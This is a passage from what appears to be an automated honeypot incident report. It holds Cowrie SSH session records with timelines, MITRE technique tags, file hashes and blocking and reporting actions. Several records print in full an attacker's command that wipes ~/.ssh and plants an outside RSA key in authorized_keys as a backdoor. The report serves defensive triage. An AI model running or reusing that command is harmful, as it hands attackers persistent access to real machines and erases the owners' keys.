| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 21:46:48` | `cowrie.session.connect` |
| `2026-06-13 21:46:48` | `cowrie.client.version` |
| `2026-06-13 21:46:48` | `cowrie.client.kex` |
| `2026-06-13 21:46:48` | `cowrie.login.success` |
| `2026-06-13 21:46:49` | `cowrie.session.params` |
| `2026-06-13 21:46:49` | `cowrie.command.input` |
| `2026-06-13 21:46:49` | `cowrie.command.failed` |
| `2026-06-13 21:46:49` | `cowrie.log.closed` |
| `2026-06-13 21:46:49` | `cowrie.session.params` |
| `2026-06-13 21:46:49` | `cowrie.command.input` |
| `2026-06-13 21:46:49` | `cowrie.session.file_download` |
| `2026-06-13 21:46:49` | `cowrie.log.closed` |
| `2026-06-13 21:46:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.213[.]49` to AbuseIPDB if not already reported
- [ ] Block `159.223.213[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-609ecd111c9d

| Field | Detail |
|---|---|
| **Source IP** | `159.223.213[.]49` |
| **First Seen** | 2026-06-13 21:46 |
| **Last Seen** | 2026-06-13 21:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 21:46:52` | `cowrie.session.connect` |
| `2026-06-13 21:46:52` | `cowrie.client.version` |
| `2026-06-13 21:46:52` | `cowrie.client.kex` |
| `2026-06-13 21:46:52` | `cowrie.login.success` |
| `2026-06-13 21:46:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.213[.]49` to AbuseIPDB if not already reported
- [ ] Block `159.223.213[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90f33195c41f

| Field | Detail |
|---|---|
| **Source IP** | `43.164.192[.]38` |
| **First Seen** | 2026-06-13 21:47 |
| **Last Seen** | 2026-06-13 21:48 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 21:47:58` | `cowrie.session.connect` |
| `2026-06-13 21:47:58` | `cowrie.client.version` |
| `2026-06-13 21:47:58` | `cowrie.client.kex` |
| `2026-06-13 21:48:00` | `cowrie.login.success` |
| `2026-06-13 21:48:01` | `cowrie.session.params` |
| `2026-06-13 21:48:01` | `cowrie.command.input` |
| `2026-06-13 21:48:01` | `cowrie.command.failed` |
| `2026-06-13 21:48:01` | `cowrie.log.closed` |
| `2026-06-13 21:48:02` | `cowrie.session.params` |
| `2026-06-13 21:48:02` | `cowrie.command.input` |
| `2026-06-13 21:48:02` | `cowrie.session.file_download` |
| `2026-06-13 21:48:02` | `cowrie.log.closed` |
| `2026-06-13 21:48:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.164.192[.]38` to AbuseIPDB if not already reported
- [ ] Block `43.164.192[.]38` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-542dac8c78c2

| Field | Detail |
|---|---|
| **Source IP** | `43.164.192[.]38` |
| **First Seen** | 2026-06-13 21:48 |
| **Last Seen** | 2026-06-13 21:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 21:48:06` | `cowrie.session.connect` |
| `2026-06-13 21:48:06` | `cowrie.client.version` |
| `2026-06-13 21:48:07` | `cowrie.client.kex` |
| `2026-06-13 21:48:08` | `cowrie.login.success` |
| `2026-06-13 21:48:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.164.192[.]38` to AbuseIPDB if not already reported
- [ ] Block `43.164.192[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-782a566d759e

| Field | Detail |
|---|---|
| **Source IP** | `159.223.213[.]49` |
| **First Seen** | 2026-06-13 21:50 |
| **Last Seen** | 2026-06-13 21:50 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 21:50:01` | `cowrie.session.connect` |
| `2026-06-13 21:50:01` | `cowrie.client.version` |
| `2026-06-13 21:50:01` | `cowrie.client.kex` |
| `2026-06-13 21:50:02` | `cowrie.login.success` |
| `2026-06-13 21:50:02` | `cowrie.session.params` |
| `2026-06-13 21:50:02` | `cowrie.command.input` |
| `2026-06-13 21:50:02` | `cowrie.command.failed` |
| `2026-06-13 21:50:03` | `cowrie.log.closed` |
| `2026-06-13 21:50:03` | `cowrie.session.params` |
| `2026-06-13 21:50:03` | `cowrie.command.input` |
| `2026-06-13 21:50:03` | `cowrie.session.file_download` |
| `2026-06-13 21:50:03` | `cowrie.log.closed` |
| `2026-06-13 21:50:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.213[.]49` to AbuseIPDB if not already reported
- [ ] Block `159.223.213[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ffc231efecc

| Field | Detail |
|---|---|
| **Source IP** | `159.223.213[.]49` |
| **First Seen** | 2026-06-13 21:50 |
| **Last Seen** | 2026-06-13 21:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 21:50:05` | `cowrie.session.connect` |
| `2026-06-13 21:50:05` | `cowrie.client.version` |
| `2026-06-13 21:50:05` | `cowrie.client.kex` |
| `2026-06-13 21:50:06` | `cowrie.login.success` |
| `2026-06-13 21:50:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.213[.]49` to AbuseIPDB if not already reported
- [ ] Block `159.223.213[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d33f945807fd

| Field | Detail |
|---|---|
| **Source IP** | `159.223.213[.]49` |
| **First Seen** | 2026-06-13 21:54 |
| **Last Seen** | 2026-06-13 21:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 21:54:30` | `cowrie.session.connect` |
| `2026-06-13 21:54:30` | `cowrie.client.version` |
| `2026-06-13 21:54:30` | `cowrie.client.kex` |
| `2026-06-13 21:54:31` | `cowrie.login.success` |
| `2026-06-13 21:54:31` | `cowrie.session.params` |
| `2026-06-13 21:54:31` | `cowrie.command.input` |
| `2026-06-13 21:54:31` | `cowrie.command.failed` |
| `2026-06-13 21:54:31` | `cowrie.log.closed` |
| `2026-06-13 21:54:31` | `cowrie.session.params` |
| `2026-06-13 21:54:31` | `cowrie.command.input` |
| `2026-06-13 21:54:32` | `cowrie.session.file_download` |
| `2026-06-13 21:54:32` | `cowrie.log.closed` |
| `2026-06-13 21:54:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.213[.]49` to AbuseIPDB if not already reported
- [ ] Block `159.223.213[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a183ae0796e9

| Field | Detail |
|---|---|
| **Source IP** | `159.223.213[.]49` |
| **First Seen** | 2026-06-13 21:54 |
| **Last Seen** | 2026-06-13 21:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 21:54:34` | `cowrie.session.connect` |
| `2026-06-13 21:54:34` | `cowrie.client.version` |
| `2026-06-13 21:54:34` | `cowrie.client.kex` |
| `2026-06-13 21:54:34` | `cowrie.login.success` |
| `2026-06-13 21:54:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.213[.]49` to AbuseIPDB if not already reported
- [ ] Block `159.223.213[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4f117c99fbf

| Field | Detail |
|---|---|
| **Source IP** | `62.238.22[.]252` |
| **First Seen** | 2026-06-13 21:56 |
| **Last Seen** | 2026-06-13 21:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 21:56:51` | `cowrie.session.connect` |
| `2026-06-13 21:56:51` | `cowrie.client.version` |
| `2026-06-13 21:56:51` | `cowrie.client.kex` |
| `2026-06-13 21:56:52` | `cowrie.login.success` |
| `2026-06-13 21:56:52` | `cowrie.session.params` |
| `2026-06-13 21:56:52` | `cowrie.command.input` |
| `2026-06-13 21:56:52` | `cowrie.command.failed` |
| `2026-06-13 21:56:52` | `cowrie.log.closed` |
| `2026-06-13 21:56:52` | `cowrie.session.params` |
| `2026-06-13 21:56:52` | `cowrie.command.input` |
| `2026-06-13 21:56:53` | `cowrie.session.file_download` |
| `2026-06-13 21:56:53` | `cowrie.log.closed` |
| `2026-06-13 21:56:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.238.22[.]252` to AbuseIPDB if not already reported
- [ ] Block `62.238.22[.]252` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24637cfae20e

| Field | Detail |
|---|---|
| **Source IP** | `62.238.22[.]252` |
| **First Seen** | 2026-06-13 21:56 |
| **Last Seen** | 2026-06-13 21:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 21:56:55` | `cowrie.session.connect` |
| `2026-06-13 21:56:55` | `cowrie.client.version` |
| `2026-06-13 21:56:55` | `cowrie.client.kex` |
| `2026-06-13 21:56:55` | `cowrie.login.success` |
| `2026-06-13 21:56:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.238.22[.]252` to AbuseIPDB if not already reported
- [ ] Block `62.238.22[.]252` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7cf43093b392

| Field | Detail |
|---|---|
| **Source IP** | `159.223.213[.]49` |
| **First Seen** | 2026-06-13 22:00 |
| **Last Seen** | 2026-06-13 22:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 22:00:47` | `cowrie.session.connect` |
| `2026-06-13 22:00:47` | `cowrie.client.version` |
| `2026-06-13 22:00:47` | `cowrie.client.kex` |
| `2026-06-13 22:00:48` | `cowrie.login.success` |
| `2026-06-13 22:00:48` | `cowrie.session.params` |
| `2026-06-13 22:00:48` | `cowrie.command.input` |
| `2026-06-13 22:00:48` | `cowrie.command.failed` |
| `2026-06-13 22:00:48` | `cowrie.log.closed` |
| `2026-06-13 22:00:49` | `cowrie.session.params` |
| `2026-06-13 22:00:49` | `cowrie.command.input` |
| `2026-06-13 22:00:49` | `cowrie.session.file_download` |
| `2026-06-13 22:00:49` | `cowrie.log.closed` |
| `2026-06-13 22:00:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.213[.]49` to AbuseIPDB if not already reported
- [ ] Block `159.223.213[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8686b598946

| Field | Detail |
|---|---|
| **Source IP** | `159.223.213[.]49` |
| **First Seen** | 2026-06-13 22:00 |
| **Last Seen** | 2026-06-13 22:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 22:00:51` | `cowrie.session.connect` |
| `2026-06-13 22:00:51` | `cowrie.client.version` |
| `2026-06-13 22:00:51` | `cowrie.client.kex` |
| `2026-06-13 22:00:52` | `cowrie.login.success` |
| `2026-06-13 22:00:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.213[.]49` to AbuseIPDB if not already reported
- [ ] Block `159.223.213[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9615d365937f

| Field | Detail |
|---|---|
| **Source IP** | `43.164.192[.]38` |
| **First Seen** | 2026-06-13 22:03 |
| **Last Seen** | 2026-06-13 22:03 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 22:03:00` | `cowrie.session.connect` |
| `2026-06-13 22:03:00` | `cowrie.client.version` |
| `2026-06-13 22:03:00` | `cowrie.client.kex` |
| `2026-06-13 22:03:02` | `cowrie.login.success` |
| `2026-06-13 22:03:03` | `cowrie.session.params` |
| `2026-06-13 22:03:03` | `cowrie.command.input` |
| `2026-06-13 22:03:03` | `cowrie.command.failed` |
| `2026-06-13 22:03:03` | `cowrie.log.closed` |
| `2026-06-13 22:03:04` | `cowrie.session.params` |
| `2026-06-13 22:03:04` | `cowrie.command.input` |
| `2026-06-13 22:03:04` | `cowrie.session.file_download` |
| `2026-06-13 22:03:04` | `cowrie.log.closed` |
| `2026-06-13 22:03:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.164.192[.]38` to AbuseIPDB if not already reported
- [ ] Block `43.164.192[.]38` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae2106c4733c

| Field | Detail |
|---|---|
| **Source IP** | `43.164.192[.]38` |
| **First Seen** | 2026-06-13 22:03 |
| **Last Seen** | 2026-06-13 22:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 22:03:08` | `cowrie.session.connect` |
| `2026-06-13 22:03:08` | `cowrie.client.version` |
| `2026-06-13 22:03:09` | `cowrie.client.kex` |
| `2026-06-13 22:03:10` | `cowrie.login.success` |
| `2026-06-13 22:03:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.164.192[.]38` to AbuseIPDB if not already reported
- [ ] Block `43.164.192[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a43fa127f4f7

| Field | Detail |
|---|---|
| **Source IP** | `43.164.192[.]38` |
| **First Seen** | 2026-06-13 22:05 |
| **Last Seen** | 2026-06-13 22:05 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 22:05:10` | `cowrie.session.connect` |
| `2026-06-13 22:05:10` | `cowrie.client.version` |
| `2026-06-13 22:05:10` | `cowrie.client.kex` |
| `2026-06-13 22:05:12` | `cowrie.login.success` |
| `2026-06-13 22:05:13` | `cowrie.session.params` |
| `2026-06-13 22:05:13` | `cowrie.command.input` |
| `2026-06-13 22:05:13` | `cowrie.command.failed` |
| `2026-06-13 22:05:13` | `cowrie.log.closed` |
| `2026-06-13 22:05:14` | `cowrie.session.params` |
| `2026-06-13 22:05:14` | `cowrie.command.input` |
| `2026-06-13 22:05:14` | `cowrie.session.file_download` |
| `2026-06-13 22:05:14` | `cowrie.log.closed` |
| `2026-06-13 22:05:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.164.192[.]38` to AbuseIPDB if not already reported
- [ ] Block `43.164.192[.]38` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66dcdb186798

| Field | Detail |
|---|---|
| **Source IP** | `43.164.192[.]38` |
| **First Seen** | 2026-06-13 22:05 |
| **Last Seen** | 2026-06-13 22:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 22:05:18` | `cowrie.session.connect` |
| `2026-06-13 22:05:18` | `cowrie.client.version` |
| `2026-06-13 22:05:19` | `cowrie.client.kex` |
| `2026-06-13 22:05:20` | `cowrie.login.success` |
| `2026-06-13 22:05:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.164.192[.]38` to AbuseIPDB if not already reported
- [ ] Block `43.164.192[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfcc7d035263

| Field | Detail |
|---|---|
| **Source IP** | `159.223.213[.]49` |
| **First Seen** | 2026-06-13 22:05 |
| **Last Seen** | 2026-06-13 22:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 22:05:31` | `cowrie.session.connect` |
| `2026-06-13 22:05:31` | `cowrie.client.version` |
| `2026-06-13 22:05:32` | `cowrie.client.kex` |
| `2026-06-13 22:05:32` | `cowrie.login.success` |
| `2026-06-13 22:05:32` | `cowrie.session.params` |
| `2026-06-13 22:05:32` | `cowrie.command.input` |
